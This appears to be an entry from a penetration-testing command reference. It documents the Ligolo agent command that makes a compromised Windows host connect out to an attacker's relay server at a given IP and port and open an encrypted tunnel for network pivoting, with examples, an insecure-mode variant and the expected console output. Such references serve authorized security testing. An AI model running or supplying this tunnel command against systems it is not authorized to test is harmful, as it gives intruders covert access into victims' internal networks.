---
id: 616fb49c-2749-4df4-a327-3c2c04547075
name: ligolo-connect-compromised-host-to-relay
type: command
executor: cmd
data: 'ligolo_windows_amd64.exe -relayserver $_RELAY_IP:$_RELAY_PORT'
output: null
created_at: '2023-04-06T03:56:22.820259+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - ligolo
  - pivoting
verified: true
validated: true
---

# ligolo-connect-compromised-host-to-relay

## Command

```cmd
ligolo_windows_amd64.exe -relayserver $_RELAY_IP:$_RELAY_PORT
```

## Description

Executes the Ligolo agent on a Windows compromised host to connect to a remote relay server, establishing an encrypted tunnel for network pivoting from the attacker's machine through the host.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_RELAY_IP | IP address of the attacker's relay server | Yes |
| $_RELAY_PORT | Port the relay is listening on (default 5555) | Yes |
| -relayserver | Flag to specify the relay server endpoint | Yes |

## Examples

### Basic Usage

```cmd
ligolo_windows_amd64.exe -relayserver 192.168.1.100:5555
```

Connects to the relay at the specified IP and port.

### Advanced Usage

```cmd
ligolo_windows_amd64.exe -relayserver 192.168.1.100:5555 -insecure
```

Uses insecure mode if certificates are not configured.

## Expected Output

Upon successful connection, the console shows:

```
[INFO] Connecting to relay server 192.168.1.100:5555...
[INFO] Connected successfully. Tunnel established.
```

The agent will then accept commands from the relay for proxying traffic.

## Related

- [[procedures/Ligolo-Local-Relay-Setup]]
- [[tools/Ligolo]]
